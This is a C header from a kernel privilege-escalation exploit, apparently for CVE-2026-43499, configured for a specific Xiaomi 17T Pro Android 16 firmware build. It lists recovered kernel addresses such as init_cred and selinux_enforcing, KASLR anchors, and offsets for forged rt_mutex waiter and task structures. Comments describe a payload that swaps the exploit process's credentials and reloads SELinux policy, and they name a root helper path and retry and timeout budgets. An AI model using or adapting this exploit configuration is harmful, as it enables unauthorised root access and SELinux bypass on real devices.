#ifndef TARGET_H
#define TARGET_H

/* Xiaomi 17T Pro (warhol) — HyperOS OS3.0.304.0.WPSJPXM (JP), MT6993 / Dimensity 9500
 *
 *   kernel 6.12.38-android16-5-g1d46253471dd-ab15048002-4k  (GKI, 4K pages)
 *   build  Xiaomi/warhol_jp/warhol:16/BP2A.250605.031.A3/...:user/release-keys
 *
 * Build with:
 *   make TARGET=warhol/jp/6.12.38-android16-5-g1d46253471dd-ab15048002-4k
 *
 * This is a 6.12 kernel, so it is built against core612 rather than the 6.6
 * core66 the other targets use. The two cores share no source.
 *
 * The block below between the "generated" markers is the generate_target.py
 * output of the upstream port, copied unchanged. Everything in it was
 * recovered from this firmware's own images:
 *
 *   python3 tools/generate_target.py \
 *     --boot boot.img --dtb vendor_boot.img --preloader preloader.bin
 *
 * Do not edit an offset in it by hand -- regenerate it. What this repository
 * adds is below that block, and is about how the payload is deployed rather
 * than about the kernel.
 */

/* --- generated: do not copy offsets by hand ------------------------------ */

/* target profile */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define PSELECT_WAITER_WORD_SHIFT 2

/* kernel image addresses */
#define INIT_TASK 0xffffffc08240cf00ULL
#define INIT_CRED 0xffffffc082422c70ULL
#define ENTRY_TASK 0xffffffc0823b2400ULL
#define PER_CPU_OFFSET 0xffffffc0823fb810ULL
#define ROOT_TASK_GROUP 0xffffffc08263e780ULL
#define SELINUX_ENFORCING 0xffffffc08268a6d0ULL

/* KASLR anchors */
#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffffc0824021a0ULL
#define SLIDE_LOGGERS_0_1_IMAGE 0xffffffc0824020e8ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffffc08252a990ULL
#define SLIDE_INIT_TASK_IMAGE 0xffffffc08240cf00ULL
#define SLIDE_ROOT_TASK_GROUP_IMAGE 0xffffffc08263e780ULL

/* waiter and fake task fields */
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x28
#define WAITER_TASK_OFF 0x50
#define WAITER_LOCK_OFF 0x58
#define WAITER_WAKE_STATE_OFF 0x60
#define WAITER_PRIO_OFF 0x18
#define WAITER_DEADLINE_OFF 0x20
#define WAITER_WW_CTX_OFF 0x68
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x94
#define FAKE_TASK_NORMAL_PRIO_OFF 0x9c
#define FAKE_TASK_TASK_GROUP_OFF 0x420
#define FAKE_TASK_PI_LOCK_OFF 0x9ec
#define FAKE_TASK_PI_WAITERS_OFF 0xa00
#define FAKE_TASK_PI_TOP_TASK_OFF 0xa10
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0xa18
#define FAKE_TASK_UCLAMP_REQ_OFF 0x428
#define FAKE_TASK_UCLAMP_OFF 0x430

/* task credential pointers */
#define TASK_REAL_CRED_OFF 0x8f8
#define TASK_CRED_OFF 0x900

/* --- end generated ------------------------------------------------------- */

/* Where root-core612.c looks for the bootstrap helper when the payload was
 * not launched by the application. The app build overrides it: the helper it
 * ships inside its APK cannot be at a fixed path, so it passes the real one in
 * CVE43499_ROOT_HELPER. core66's targets spell the same path as ROOT_UMH_PATH,
 * where the kernel rather than the payload is the one that execs it. */
#define ROOT_HELPER_PATH "/data/local/tmp/cve-2026-43499-root"

/* core612's direct stage reloads the whole SELinux policy and swaps the
 * exploit process's own cred, so a failed attempt does not leave the kernel in
 * the state the next one expects. It is verified one-shot on this device;
 * until a retry is verified as well, the supervisor gets a small budget rather
 * than core66's. See payload_default_attempts() in root-core612.c. */
#define PAYLOAD_ATTEMPT_BUDGET 3

/* The same reasoning applied to the supervisor's SIGKILL. core612 retries
 * internally -- 20 slide attempts, each of which can wait ROUTE_WAIT_SECONDS
 * and then a PSELECT_TIMEOUT_SEC pselect -- so 90 seconds would cut healthy
 * runs short, and the kill would land wherever the attempt happened to be.
 * 3 x 300s is the application's own 15-minute ceiling on the whole run, so
 * this is the binding limit without a third attempt starting past it. */
#define PAYLOAD_ATTEMPT_TIMEOUT_SEC 300

#endif
